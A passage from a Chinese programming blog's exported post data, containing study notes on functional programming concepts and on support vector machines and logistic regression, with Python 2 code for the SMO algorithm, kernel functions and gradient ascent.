，用来传递待执行的变换代码，如map之类的高阶函数。注意闭包是代码块，而不是一个值，各个闭包内部状态都是独立的，尽管局部变量不在代码块内定义，但只要代码块引用了该变量，两者就被绑定在一起，这种联系在代码块实例的全部生命期内一直保持着。从实现的角度说， 代码块实例从它被创建的一刻起，就持有其作用域内一切事物的封闭副本 。下面的代码展示了闭包的异地执行。闭包所表现出来的函数式思维就是，“让运行时去管理状态”。 1234567891011def Closure makeCounter()&#123; def local_variable = 0 return &#123; return local_variable += 1&#125;&#125;c1 = makeCounter()c1()c1()c1()c2 = makeCounter()println \"C1 = $&#123;c1()&#125;, C2 = $&#123;c2()&#125;\"// output: C1 = 4, C2 = 1 // 柯里化 指的是从一个多参数函数变成 一连串单参数函数 的变换。它描述的是 变换的过程 ，不涉及变换之后对函数的调用。调用者可以决定对多少个参数实施变换，余下的部分将衍生成一个参数数目较少的新函数。举例来说，函数process(x, y, z)完全柯里化之后变成process(x)(y)(z)的性质，其中process(x)和process(x)(y)都是单参数的函数。如果只对第一个参数柯里化，那么process(x)的返回值将是一个单参数的函数，而这个唯一的参数又接受另一个参数的输入。 函数柯里化的结果是返回链条中的下一个函数 。 部分施用 指提前代入一部分参数值，使一个多参数得以省略部分参数，从而转化为一个参数数目较少的函数。 部分施用是把参数的取值绑定到用户在操作中提供的具体值上 。 递归 的核心在于对一个不断变短的列表反复做同一件事，利用递归，将状态的管理责任推给运行时。递归没有成为一种平常的操作，一个主要原因是栈的增长。使用尾调用优化的写法来帮助运行时科夫栈的增长问题。当递归调用是函数执行的最后一个调用时，运行时往往可以在栈里就地更新，而不需要增加新的栈空间。因此 尽可能多的使用尾递归的写法 。 记忆和缓求值 只有对纯函数才能放心地使用函数缓存的结果，这刚好符合函数式特性。对于Groovy，可以先将记忆的函数定义为闭包，再对闭包使用memoize()方法获得一个新函数，这个新函数调用的时候结果就会被缓存起来。在Haskell中好像下面的链接可以实现。我们写出来的缓存决不可能比语言开发者设计的更高效，因为语言设计者可以无视他们给语言设定的规定。 语言设计者实现出来的机制总是比开发者自己做的效率高 。Haskell-Wiki上的Memoization 缓求值的好处：昂贵的运算只有到了绝对必要的时候才执行；可以建立无限大的集合，只要一接到请求就一直送出元素；按缓求值的方式使用map、filter等，可以产生更高效的代码。特别适合于资源生产成本较高的情况。Haskell的惰性求值就是这样的特性，是非严格求值的。在严格求值的语言运行下面代码会报错，而非严格求值的语言会得出4。 1print length([2+1, 3*2, 1/0, 5-4]) 语言演化 少量的数据结构搭配大量的操作。函数式语言有很多操作，但对应的数据结构很少。面向对象语言鼓励建立专门针对某个类的方法，我们从类的关系中发现重复出现的模式并加以重用。 函数式语言的重用表现在函数的通用性上，他们鼓励在数据结构上使用各种共通的变换，并通过高阶函数来调整操作以满足具体事项的要求 。 100个函数操作一种数据结构的组合，要好过10个函数操作10种数据结构的组合。——Alan Perlis 让语言去迎合问题 ，不要拿问题硬套语言，而是想法揉捏手中的语言来迎合问题。Lisp家族的语言传承了无可比拟的灵活性，对DSL的支持比主流语言要强得多。 函数式偏好没有副作用的纯函数，“异常”违背了这个条件。因此函数式语言通过Either类这种不相交联合体，返回左值表示错误信息，右值表示正常结果。函数式语言关注 引用的透明性 ，发出调用的例程不必关心他的访问对象真的是一个值，还是一个返回值的函数。 现代语言大多数是多范式的，支持多种多样的编程范式，如OOP，元编程、函数式、过程式等等。这些范式在语言中相互正交（没有任何影响），不会相互干扰。 设计模式的变化，模式已被函数式语言吸收成为了语言的一部分，语言特性简化了实现细节。OOP模式和FP模式已经具备了不同的意义。面向对象倾向于封装对象的重用，在不同的结构之间 耦合 。而函数式编程则依靠零件之间的 复合 来组织抽象，以达到减少不确定因素的目的。 参考文献： 《函数式编程思维 - 美 Neal Ford》 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/13/functional-thinking/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"函数式编程","slug":"函数式编程","permalink":"http://forec.github.io/tags/函数式编程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"机器学习笔记（Chapter 06 - 支持向量机）","slug":"machinelearning6","date":"2016-02-11T10:05:05.000Z","updated":"2017-08-22T07:30:36.000Z","comments":true,"path":"2016/02/11/machinelearning6/","link":"","permalink":"http://forec.github.io/2016/02/11/machinelearning6/","excerpt":"支持向量机（Support Vector Machineds，SVM）是一个二类问题的分类器，实现方法多样，这里采用了序列最小优化（SMO）实现方法，并通过核函数拓展到非线性可分的SVM。","text":"支持向量机（Support Vector Machineds，SVM）是一个二类问题的分类器，实现方法多样，这里采用了序列最小优化（SMO）实现方法，并通过核函数拓展到非线性可分的SVM。 SVM和最大边缘超平面 SVM的优缺点 优点：泛化错误率低，计算开销不大撒，结果易解释 缺点：对参数调节和核函数的选择敏感，原始分类器不加修改情况下仅适用于处理二类问题 适用数值类型：数值型和标称型 最大边缘超平面：在二维平面上分布的二类数值点，如果可以通过一条直线将两组不同类的数据分开，则这组数据线性可分。在假设数据线性可分的前提下，将数据集分开的直线被称为分隔超平面，如果数据分布在三位平面，那么分隔超平面就是二维的。如果数据集分布在N维空间，则分隔超平面是N-1维。如果数据点离分隔超平面越远，则最后的预测结果就越好。因为决策边界边缘较小的分类器对模型的过分拟合更加敏感，从而在未知的样本上的泛化能力很差。 支持向量：离分隔超平面最近的那些点，支持向量机决策只依赖支持向量。 寻找最大间隔：用向量的形式W·X+b书写分隔超平面不需要考虑空间维度，其中向量W和常量b描述了所给数据的分隔超平面。因此SVM需要寻找使分隔超平面成为最大边缘超平面的W和b。 分隔超平面目标函数的优化 SVM工作原理：与Logistic回归类似，使用一个类似海维赛德阶跃函数的函数对所给数据的W·X+b的结果判定分类，如果结果大于0则输出+1，否则输出-1。使用+1和-1而不使用1和0的作用在于，可以通过一个统一公式来表示间隔或者数据点到分隔超平面的距离。 函数间隔和几何间隔：点到分隔超平面的函数间隔为y*(wx+b)，其中y是函数的类别标签（+1或-1）；点到超平面的几何间隔为y*(wx+b)/||w||。SVM使用几何间隔定义数据点和超平面的距离，因为如果使用函数间隔，则随着w的放大，（wx+b）的值也随之不断增大，此时最优化（最大化）距离无法确定w。《机器学习实战》对SVM的原理介绍很粗略，并且直接给出了最终的可以解决线性不可分情况的公式。《机器学习实战》中SMO之前的部分在July的支持向量机通俗导论的第一层有比较清楚的介绍。 下面部分《机器学习实战》没有讲，在《数据挖掘导论》的5.5节。 边缘公式的优化：要最大化最小间隔几何距离，考虑离决策边界最近的数据，如果数据在决策边界上方，则wx+b的结果是正值，在下方为负值，我们可以固定一个因子，调整另一个因子来优化最大值。因此我们设置一个约束条件y*(wx+b)&gt;=1，这意味着所有的数据都在wx+b&gt;=1和wx+b&lt;=-1的范围内，距离超平面越远的店，其wx+b的绝对值就越大，只有支持向量才满足y(wx+b)=1的。我们选取两个数据点，一个在wx+b=1直线上，一个在wx+b=-1直线上，相减得到w(x1-x2)=2，注意w、x1和x2都是向量，所以d=x1-x2就代表着两点之间平行于超平面法线方向的距离。因此d=2/||w||。要让d最大，等价于让f(w)=||w||^2/2最小。因此，调整后的目标函数是f(w)，并且受到y(wx+b)&gt;=1的约束。目标函数是二次的，w和b是线性的，因此该问题是凸优化问题（凸函数一阶可微，二阶导衡非负），此时可以引入拉格朗日算子，并且根据KKT条件将不等式约束改为等式约束y(wx+b)-1=0 ，变为最小化Lp = ||w||^2/2 - ∑(λ(y(wx+b)-1)，观察这个式子，我们限定λ&gt;=0。其一阶导数为0，得到w=∑λyx，∑λy=0。将这两个条件代入拉格朗日算子的公式中，就得到书中的最后的目标函数。 不可分情况的处理：如果有少数数据噪声，需要引入正值的松弛变量ε，修改约束条件为y(wx+b)-(1-ε)&gt;=0，假设直线wx+b=-1+ε经过数据点P，并且平行于决策边界，那么P到wx+b=-1的距离是ε/||w||。因此，ε提供了决策边界在训练样本P上的误差估计。同样，因为我们在决策边界上允许了一定的错误，可能导致误分许多的实例，所以对松弛变量很大的边界进行惩罚，修改后的目标函数为f(w) = ||w||^2 /2 +C(∑ε)^k，其中C和k是用户指定的参数，用于对误分的数据进行惩罚。假定k=1。这样修改后问题的拉格朗日函数多了一项-∑με，利用KKT条件约束，一阶导数为0，得到额外条件μ+λ =C，因此0&lt;=λ&lt;=C，配合∑λy = 0，这就是书中最终给出的约束公式。 SMO求解最优化问题 推荐JerryLead博客中的支持向量机（五）SMO算法。 SMO算法的目标是求出一系列α和b，这里的α就是上面约束条件中的λ（拉格朗日乘子），因为参考的博客和书中都用α，下面也都用α。只要求出了α，根据w=∑αyx，就能够求出w。工作原理是每次循环选择两个alpha进行优化处理，一旦找到一对可以优化的α，就增大其中一个，同时减少另外一个。这两个α的选择方法决定了SMO的效率和正确率。 SMO算法里的辅助函数 123456789101112131415161718192021def loadDataSet(fileName): dataMat = []; labelMat = [] fr = open(fileName) for line in fr.readlines(): lineArr = line.strip().split('\\t') dataMat.append([float(lineArr[0]), float(lineArr[1])]) labelMat.append(float(lineArr[2])) return dataMat, labelMat def selectJrand(i, m): j = i while (j == i): j = int(random.uniform(0,m)) return j def clipAlpha(aj, H, L): if aj &gt; H: aj = H if L &gt; aj: aj = L return aj 《机器学习实战》书中先给了简化版的SMO算法，每次先选定一个α，然后随机选取另一个α。如果所有向量都没有被优化，就增加迭代次数，直到达到要求的迭代次数。书中给出平均速度14.5s。 12345678910111213141516171819202122232425262728293031323334353637383940def smoSimple(dataMatIn, classLabels, C, toler, maxIter): dataMatrix = mat(dataMatIn); labelMat = mat(classLabels).transpose() b = 0; m,n = shape(dataMatrix) alphas = mat(zeros((m,1))) iter = 0 while (iter &lt; maxIter): alphaPairsChanged = 0 for i in range(m): fXi = float(multiply(alphas,labelMat).T*(dataMatrix*dataMatrix[i,:].T)) + b Ei = fXi - float(labelMat[i])#if checks if an example violates KKT conditions if ((labelMat[i]*Ei &lt; -toler) and (alphas[i] &lt; C)) or ((labelMat[i]*Ei &gt; toler) and (alphas[i] &gt; 0)): j = selectJrand(i,m) fXj = float(multiply(alphas,labelMat).T*(dataMatrix*dataMatrix[j,:].T)) + b Ej = fXj - float(labelMat[j]) alphaIold = alphas[i].copy(); alphaJold = alphas[j].copy(); if (labelMat[i] != labelMat[j]): L = max(0, alphas[j] - alphas[i]) H = min(C, C + alphas[j] - alphas[i]) else: L = max(0, alphas[j] + alphas[i] - C) H = min(C, alphas[j] + alphas[i]) if L==H: print \"L==H\"; continue eta = 2.0 * dataMatrix[i,:]*dataMatrix[j,:].T - dataMatrix[i,:]*dataMatrix[i,:].T - dataMatrix[j,:]*dataMatrix[j,:].T if eta &gt;= 0: print \"eta&gt;=0\"; continue alphas[j] -= labelMat[j]*(Ei - Ej)/eta alphas[j] = clipAlpha(alphas[j],H,L) if (abs(alphas[j] - alphaJold) &lt; 0.00001): print \"j not moving enough\"; continue alphas[i] += labelMat[j]*labelMat[i]*(alphaJold - alphas[j])#update i by the same amount as j #the update is in the oppostie direction b1 = b - Ei- labelMat[i]*(alphas[i]-alphaIold)*dataMatrix[i,:]*dataMatrix[i,:].T - labelMat[j]*(alphas[j]-alphaJold)*dataMatrix[i,:]*dataMatrix[j,:].T b2 = b - Ej- labelMat[i]*(alphas[i]-alphaIold)*dataMatrix[i,:]*dataMatrix[j,:].T - labelMat[j]*(alphas[j]-alphaJold)*dataMatrix[j,:]*dataMatrix[j,:].T if (0 &lt; alphas[i]) and (C &gt; alphas[i]): b = b1 elif (0 &lt; alphas[j]) and (C &gt; alphas[j]): b = b2 else: b = (b1 + b2)/2.0 alphaPairsChanged += 1 print \"iter: %d i:%d, pairs changed %d\" % (iter,i,alphaPairsChanged) if (alphaPairsChanged == 0): iter += 1 else: iter = 0 print \"iteration number: %d\" % iter return b,alphas 启发式选择方法：每次选择α时，优先选择样本前面系数0&lt;α&lt;C的α作优化，因为在界上（α为0或C）的样例对应的α一般不会更改。这种启发式搜索方法是选择第一个α用的，只要选择出来的两个α中有一个违背了KKT条件，那么目标函数在一步迭代后值会减小。违背KKT条件不代表0&lt;α&lt;C，在界上也有可能会违背。因此在给定初始值α1=0后，先对所有样例进行循环，循环中碰到违背KKT条件的（不管界上还是界内）都进行迭代更新。等这轮过后，如果没有收敛，第二轮就只针对的样例进行迭代更新。在第一个α选择后，第二个α也使用启发式方法选择，第二个α的迭代步长大致正比于|E1-E2|，选择第二个α能够最大化|E1-E2|。即当E1为正时选择负的绝对值最大的E2，反之，选择正值最大的E2。最后的收敛条件是在界内（0&lt;α&lt;C）的样例都能够遵循KKT条件，且其对应的α只在极小的范围内变动。 完整的Platt SMO算法，书上数据平均时间0.78秒，下面是用到的辅助函数和结构。 123456789101112131415161718192021222324252627282930313233343536class optStruct: def __init__(self,dataMatIn, classLabels, C, toler): # Initialize the structure with the parameters self.X = dataMatIn self.labelMat = classLabels self.C = C self.tol = toler self.m = shape(dataMatIn)[0] self.alphas = mat(zeros((self.m,1))) self.b = 0 self.eCache = mat(zeros((self.m,2))) #first column is valid flag def calcEk(oS, k): fXk = float(multiply(oS.alphas,oS.labelMat).T*(oS.X*oS.X[k,:].T)) + oS.b Ek = fXk - float(oS.labelMat[k]) return Ek def selectJK(i, oS, Ei): #this is the second choice -heurstic, and calcs Ej maxK = -1; maxDeltaE = 0; Ej = 0 oS.eCache[i] = [1,Ei] #set valid #choose the alpha that gives the maximum delta E validEcacheList = nonzero(oS.eCache[:,0].A)[0] if (len(validEcacheList)) &gt; 1: for k in validEcacheList: #loop through valid Ecache values and find the one that maximizes delta E if k == i: continue #don't calc for i, waste of time Ek = calcEk(oS, k) deltaE = abs(Ei - Ek) if (deltaE &gt; maxDeltaE): maxK = k; maxDeltaE = deltaE; Ej = Ek return maxK, Ej else: #in this case (first time around) we don't have any valid eCache values j = selectJrand(i, oS.m) Ej = calcEk(oS, j) return j, Ejdef updateEkK(oS, k):#after any alpha has changed update the new value in the cache Ek = calcEk(oS, k) oS.eCache[k] = [1,Ek] 完整SMO的内循环 123456789101112131415161718192021222324252627def innerL(i, oS): Ei = calcEk(oS, i) if ((oS.labelMat[i]*Ei &lt; -oS.tol) and (oS.alphas[i] &lt; oS.C)) or ((oS.labelMat[i]*Ei &gt; oS.tol) and (oS.alphas[i] &gt; 0)): j,Ej = selectJ(i, oS, Ei) #this has been changed from selectJrand alphaIold = oS.alphas[i].copy(); alphaJold = oS.alphas[j].copy(); if (oS.labelMat[i] != oS.labelMat[j]): L = max(0, oS.alphas[j] - oS.alphas[i]) H = min(oS.C, oS.C + oS.alphas[j] - oS.alphas[i]) else: L = max(0, oS.alphas[j] + oS.alphas[i] - oS.C) H = min(oS.C, oS.alphas[j] + oS.alphas[i]) if L==H: print \"L==H\"; return 0 eta = 2.0 * oS.X[i,:]*oS.X[j,:].T - oS.X[i,:]*oS.X[i,:].T - oS.X[j,:]*oS.X[j,:].T if eta &gt;= 0: print \"eta&gt;=0\"; return 0 oS.alphas[j] -= oS.labelMat[j]*(Ei - Ej)/eta oS.alphas[j] = clipAlpha(oS.alphas[j],H,L) updateEk(oS, j) #added this for the Ecache if (abs(oS.alphas[j] - alphaJold) &lt; 0.00001): print \"j not moving enough\"; return 0 oS.alphas[i] += oS.labelMat[j]*oS.labelMat[i]*(alphaJold - oS.alphas[j])#update i by the same amount as j updateEk(oS, i) #added this for the Ecache #the update is in the oppostie direction b1 = oS.b - Ei- oS.labelMat[i]*(oS.alphas[i]-alphaIold)*oS.X[i,:]*oS.X[i,:].T - oS.labelMat[j]*(oS.alphas[j]-alphaJold)*oS.X[i,:]*oS.X[j,:].T b2 = oS.b - Ej- oS.labelMat[i]*(oS.alphas[i]-alphaIold)*oS.X[i,:]*oS.X[j,:].T - oS.labelMat[j]*(oS.alphas[j]-alphaJold)*oS.X[j,:]*oS.X[j,:].T if (0 &lt; oS.alphas[i]) and (oS.C &gt; oS.alphas[i]): oS.b = b1 elif (0 &lt; oS.alphas[j]) and (oS.C &gt; oS.alphas[j]): oS.b = b2 else: oS.b = (b1 + b2)/2.0 return 1 else: return 0 下面是外循环代码 123456789101112131415161718192021def smoP(dataMatIn, classLabels, C, toler, maxIter): #full Platt SMO oS = optStruct(mat(dataMatIn),mat(classLabels).transpose(),C,toler) iter = 0 entireSet = True; alphaPairsChanged = 0 while (iter &lt; maxIter) and ((alphaPairsChanged &gt; 0) or (entireSet)): alphaPairsChanged = 0 if entireSet: #go over all for i in range(oS.m): alphaPairsChanged += innerL(i,oS) print \"fullSet, iter: %d i:%d, pairs changed %d\" % (iter,i,alphaPairsChanged) iter += 1 else:#go over non-bound (railed) alphas nonBoundIs = nonzero((oS.alphas.A &gt; 0) * (oS.alphas.A &lt; C))[0] for i in nonBoundIs: alphaPairsChanged += innerL(i,oS) print \"non-bound, iter: %d i:%d, pairs changed %d\" % (iter,i,alphaPairsChanged) iter += 1 if entireSet: entireSet = False #toggle entire set loop elif (alphaPairsChanged == 0): entireSet = True print \"iteration number: %d\" % iter return oS.b,oS.alphas 下面是求W和分类函数 12345678910111213def calcWs(alphas, dataArr, classLabels): X = mat(dataArr); labelMat = mat(classLabels).transpose() m, n = shape(X) w = zeros((n,1)) # n*1 for i in range(m): w += multiply(alphas[i] * labelMat[i], X[i,:].T) # n*1*1 (1*n)^T return wdef classified(dat, ws, b): if dat * mat(ws) + b &gt; 0: return 1 else: return -1 核函数 来自《数据挖掘导论》，并参考知乎上关于机器学习中核函数的讨论 径向基函数（RBF）：是一个采用向量作为自变量的函数，能够基于向量距离运算输出一个标量。 核函数和SVM是两个正交的概念，通过核函数可以将当前维度无法线性划分的数据转移到高维（无穷维度）。SVM核的变换后空间也称为再生核希尔伯特空间（RKHS），使用核函数计算点积开销更小，并且计算在原空间进行，无须担心维灾难问题。 Mercer定理：对非线性SVM使用的核函数的主要要求是，必须存在一个相应的变换，使得计算一对向量的核函数等价于在变换后的空间中计算这对向量的点积。核函数K可以表示为K(u, v) = Φ(u)Φ(v)，当且仅当对于任意满足∫g(x)^2dx为有限值得函数g(x)，则∫K(x,y)g(x)g(y)dxdy &gt;= 0。满足这个定理的核函数称为正定核函数。例如K(x,y) = (x·y+1)^p，K(x,y) = e^(-(|x-y|^2)/2σ^2))，K(x,y) = tanh(ky·y - δ)。 核函数转换 123456789101112def kernelTrans(X, A, kTup): m, n = shape(X) K = mat(zeros((m,1))) if kTup[0] == 'lin': K = X*A.T elif kTup[0] == 'rbf': for j in range(m): deltaRow = X[j,:] - A K[j] = deltaRow * deltaRow.T K = exp(K / (-1*kTup[1]**2)) else: raise NameError(\"Houston We Have a Problem -- \\ That kernel is not recognized\") return K 下面是测试函数，需要对函数innerL和calcEk和类optStruct做一定修改。 123456789101112131415161718192021222324def testRbf(k1=1.3): dataArr, labelArr = loadDataSet('testSetRBF.txt') b, alphas = smoP(dataArr, labelArr, 200, 0.0001, 10000, ('rbf',k1)) datMat = mat(dataArr); labelMat = mat(labelArr).transpose() svInd = nonzero(alphas.A &gt; 0)[0] sVs = datMat[svInd] labelSV = labelMat[svInd] print \"there are %d Support Vectors\" % shape(sVs)[0] m, n = shape(datMat) errorCount = 0 for i in range(m): kernelEval = kernelTrans(sVs, datMat[i,:], ('rbf',k1)) predict = kernelEval.T * multiply(labelSV, alphas[svInd]) + b if sign(predict) != sign(labelArr[i]) : errorCount += 1 print \"the training error rate is %f\" % (float(errorCount)/m) dataArr, labelArr = loadDataSet('testSetRBF2.txt') datMat = mat(dataArr); labelMat = mat(labelArr).transpose() m, n = shape(datMat) errorCount = 0 for i in range(m): kernelEval = kernelTrans(sVs, datMat[i,:], ('rbf',k1)) predict = kernelEval.T * multiply(labelSV, alphas[svInd]) + b if sign(predict) != sign(labelArr[i]) : errorCount += 1 print \"the test error rate is %f\" % (float(errorCount)/m) 原代码需要修改的地方 123456789101112131415161718192021222324252627282930def innerL(): ··· eta = 2.0 * oS.K[i,j] - oS.K[i,i] - oS.K[j,j] ··· b1 = oS.b - Ei - oS.labelMat[i] * (oS.alphas[i] - alphaIold) * oS.K[i,i] -\\ oS.labelMat[j] * (oS.alphas[j] - alphaJold) * oS.K[i,j] b2 = oS.b - Ej - oS.labelMat[i] * (oS.alphas[i] - alphaIold) * oS.K[i,j] - \\ oS.labelMat[j] * (oS.alphas[j] - alphaJold) * oS.K[j,j] ··· def calcEk(oS, k): fXk = float(multiply(oS.alphas, oS.labelMat).T * oS.K[:,k] + oS.b) Ek = fXk - float(oS.labelMat[k]) return Ek class optStruct: def __init__(self, dataMatIn, classLabels, C, toler, kTup): self.X = dataMatIn self.labelMat = classLabels self.C = C self.tol = toler self.m = shape(dataMatIn)[0] self.alphas = mat(zeros((self.m,1))) self.b = 0 self.eCache = mat(zeros((self.m,2))) self.K = mat(zeros((self.m, self.m))) for i in range(self.m): self.K[:,i] = kernelTrans(self.X, self.X[i,:], kTup) kNN手写问题回顾 SVM是二类分类器，将非9的数字判为-1，否则判为1。 Code - testDigits - svmMLiA.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748def img2vector(filename): returnVect = zeros((1,1024)) fr = open(filename) for i in range(32): lineStr = fr.readline() for j in range(32): returnVect[0,32*i+j] = int(lineStr[j]) return returnVectdef loadImages(dirName): from os import listdir hwLabels = [] trainingFileList = listdir(dirName) #load the training set m = len(trainingFileList) trainingMat = zeros((m,1024)) for i in range(m): fileNameStr = trainingFileList[i] fileStr = fileNameStr.split('.')[0] #take off .txt classNumStr = int(fileStr.split('_')[0]) if classNumStr == 9: hwLabels.append(-1) else: hwLabels.append(1) trainingMat[i,:] = img2vector('%s/%s' % (dirName, fileNameStr)) return trainingMat, hwLabelsdef testDigits(kTup=('rbf', 10)): dataArr,labelArr = loadImages('trainingDigits') b,alphas = smoP(dataArr, labelArr, 200, 0.0001, 10000, kTup) datMat=mat(dataArr); labelMat = mat(labelArr).transpose() svInd=nonzero(alphas.A&gt;0)[0] sVs=datMat[svInd] labelSV = labelMat[svInd]; print \"there are %d Support Vectors\" % shape(sVs)[0] m,n = shape(datMat) errorCount = 0 for i in range(m): kernelEval = kernelTrans(sVs,datMat[i,:],kTup) predict=kernelEval.T * multiply(labelSV,alphas[svInd]) + b if sign(predict)!=sign(labelArr[i]): errorCount += 1 print \"the training error rate is: %f\" % (float(errorCount)/m) dataArr,labelArr = loadImages('testDigits') errorCount = 0 datMat=mat(dataArr); labelMat = mat(labelArr).transpose() m,n = shape(datMat) for i in range(m): kernelEval = kernelTrans(sVs,datMat[i,:],kTup) predict=kernelEval.T * multiply(labelSV,alphas[svInd]) + b if sign(predict)!=sign(labelArr[i]): errorCount += 1 print \"the test error rate is: %f\" % (float(errorCount)/m) 修改径向基核函数的参数σ，观察错误率。σ下降，则训练错误率降低，测试错误率上升。最小的训练错误率并不对应于最小的向量支持数目。另外线性和函数的效果并不很糟糕，可以牺牲线性核函数的错误率来换取分类速度的提高。 多类分类问题 第一种方法将多类问题分解为K个二类问题，对于类别yi，属于类别yi的为一类，不属于yi的为另一类。此方法称为一对其他（1-r）方法。 第二种方法为一对一（1-1）方法，构建K(K-1)/2个分类器，没一个分类器用来区分一对类(yi,yj)，此时忽略其他类的样本。 以上两种方法都使用二类分类器的组合预测，并投票表决，票数多的分类为最终分类。这种方法可能导致不同类的平局。 纠错输出编码：1-r和1-1方法都对二元分类的错误太敏感。可以参考海明编码，为每个类别分配一个码字，码字的每个二进制位训练一个二元分类器。 支持向量机总结 支持向量机是一种二类分类器，通过求解一个二次优化问题来最大化分类间隔。通过SMO算法每次优化两个α可以提升SVM的训练速度。核函数可以从一个低维空间的非线性数据映射到一个高维空间的线性数据i，此部分可以参考知乎。 SVM问题可以表示为凸优化问题，利用已知的有效算法发现目标函数的全局最小值。通过最大化决策边界的边缘来控制模型的能力，用户必须提供其他参数，如核函数类型、松弛变量带来的惩罚C。 参考文献： 《机器学习实战 - 美Peter Harrington》、《数据挖掘导论 - 美Pang-Ning Tan等》 参考的文章等：July的文章，JerryLead的文章，王赟 Maigo等在知乎上的答案 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/11/machinelearning6/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"机器学习笔记（Chapter 05 - Logistic回归）","slug":"machinelearning5","date":"2016-02-09T10:57:05.000Z","updated":"2017-08-22T07:30:40.000Z","comments":true,"path":"2016/02/09/machinelearning5/","link":"","permalink":"http://forec.github.io/2016/02/09/machinelearning5/","excerpt":"Logistic回归根据现有数据对边界回归线建立回归公式，以此进行分类。训练分类器时的做法就是寻找最佳拟合参数，使用的是最优化算法。","text":"Logistic回归根据现有数据对边界回归线建立回归公式，以此进行分类。训练分类器时的做法就是寻找最佳拟合参数，使用的是最优化算法。 Logistic回归和Sigmoid函数 Logistic回归过程 准备数据：需要进行距离运算，数据类型为数值型，结构化数据格式最佳。 分析数据：任意方法。 训练算法：大部分时间用于训练，训练目的为了找到最佳的分类回归系统。 测试算法：训练步骤完成后分类将会很快。 使用算法：输入数据并将其转换为对应的结构化数值，之后基于训练好的回归系数可以对这些数值进行简单的回归计算，判定其属于哪个类别。 Logistic回归优缺点 优点：计算代价不高，易于理解和实现 缺点：容易欠拟合，分类精度不高 使用数据类型：数值型和标称型 Sigmoid函数：是近似海维塞德阶跃函数（单位阶跃函数），σ(z)=1/(1+e^(-z))。当x为0时，Sigmoid(0)=0.5，随着x的增大减小，σ(x)将逼近1和0。当横坐标刻度足够大，Sigmoid看起来类似阶跃函数。我们将输入数据的每个特征乘以对应的回归系数，得到的结果相加，作为Sigmoid函数的参数，得到一个范围在0-1之间的数值，若大于0.5则归入1，小于0.5则归入0。因此Logistic回归可以被看成概率估计。 最佳回归系数确定 梯度上升法与梯度下降法类似，梯度上升算法用来求函数的最大值，梯度下降算法用来求函数的最小值。思想为要找到某函数的最大值，则沿着该函数的梯度方向探寻。梯度上升法到达每个点后会重新估计移动方向，循环迭代直至满足停止条件。对于线性回归系数，初始状态均为1，每次迭代的计算公式为w:=w+α▽f(w)，▽f(w)是在w处的梯度，α是沿梯度方向移动量大小，记为步长。该公式一直迭代执行，直到停止条件，比如迭代次数达到某个指定值，或误差达到指定精度。 使用梯度上升找到最佳参数，R为迭代次数，流程如下： 每个回归系数初始化为1 重复以下步骤R次：计算整个数据集的梯度，使用alpha*gradient更新回归系数的向量，返回回归系数 Code - gradAscent - logRegres.py 1234567891011121314def sigmoid(inX): # the array from numpy can be used as a single parameter return 1.0/(1+exp(-inX))def gradAscent(dataMatIn, classLabels): dataMatrix = mat(dataMatIn) # m*n labelMat = mat(classLabels).transpose() # m*1 m, n = shape(dataMatrix) alpha = 0.001 maxCycles = 500 weights = ones((n,1)) # n*1 for k in range(maxCycles): h = sigmoid(dataMatrix*weights) # m*1 error = (labelMat - h) # counting error direction, m*1 weights = weights + alpha * dataMatrix.transpose() * error return weights Code - loadDataSet - logRegres.py ，loadDataSet函数导入testSet.txt，返回数据矩阵和标签。gradAscent接收数据矩阵和标签，并返回生成的回归系数向量。 12345678def loadDataSet(): dataMat = []; labelMat = [] fr = open('testSet.txt') for line in fr.readlines(): lineArr = line.strip().split() dataMat.append([1.0, float(lineArr[0]), float(lineArr[1])]) labelMat.append(int(lineArr[2])) return dataMat, labelMat Code - plotBestFit - logRegres.py 1234567891011121314151617181920212223242526def plotBestFit(weights): import matplotlib.pyplot as plt dataMat, labelMat = loadDataSet() dataArr = array(dataMat) n = shape(dataArr)[0] xcord1 = []; ycord1 = [] xcord2 = []; ycord2 = [] for i in range(n): if int(labelMat[i]) == 1: xcord1.append(dataArr[i,1]); ycord1.append(dataArr[i,2]) else: xcord2.append(dataArr[i,1]); ycord2.append(dataArr[i,2]) fig = plt.figure() ax = fig.add_subplot(111) ax.scatter(xcord1, ycord1, s = 30, c = 'red', marker = 's') ax.scatter(xcord2, ycord2, s = 30, c = 'green') x = arange(-3.0, 3.0, 0.1) y = (-weights[0]-weights[1]*x)/weights[2] ax.plot(x,y) plt.xlabel('x1'); plt.ylabel('x2'); plt.show()#&gt;&gt;&gt; import logRegres#&gt;&gt;&gt; dataArr, labelMat = logRegres.loadDataSet()#&gt;&gt;&gt; weights = logRegres.gradAscent(dataArr, labelMat)#&gt;&gt;&gt; logRegres.plotBestFit(weights.getA()) 随机梯度上升 gradAscent函数迭代五百次，并且每次计算都要遍历整个数据集，对于大规模数据复杂度过高。改进方法为每次仅用一个样本点来更新回归系数，只在新样本到来时对分类器进行增量式更新，是在线学习算法。流程如下。 所有回归系数初始化为1 对数据集中的每个样本：计算该样本的梯度，使用alpha*gradient更新回归系数值 返回回归系数值 Code - stocGradAscent0 - logRegres.py，随机上升算法在200次迭代时的系数变化过程在《机器学习实战》82页，其中系数X2经过50次迭代后达到稳定，而系数1和0则需要更多次迭代。并且，在大的波动停止后，还有一些小的周期性波动，这源于数据中存在一些不能正确分类的样本点（数据集非线性可分），在每次迭代时会引发系统的剧烈震荡。 123456789def stocGradAscent0(dataMatrix, classLabels): m, n = shape(dataMatrix) weights = ones(n) alpha = 0.01 for i in range(m): h = sigmoid(sum(dataMatrix[i]*weights)) error = classLabels[i] - h weights = weights + alpha * error * dataMatrix[i] return weights Improve - Code -stocGradAscent1 - 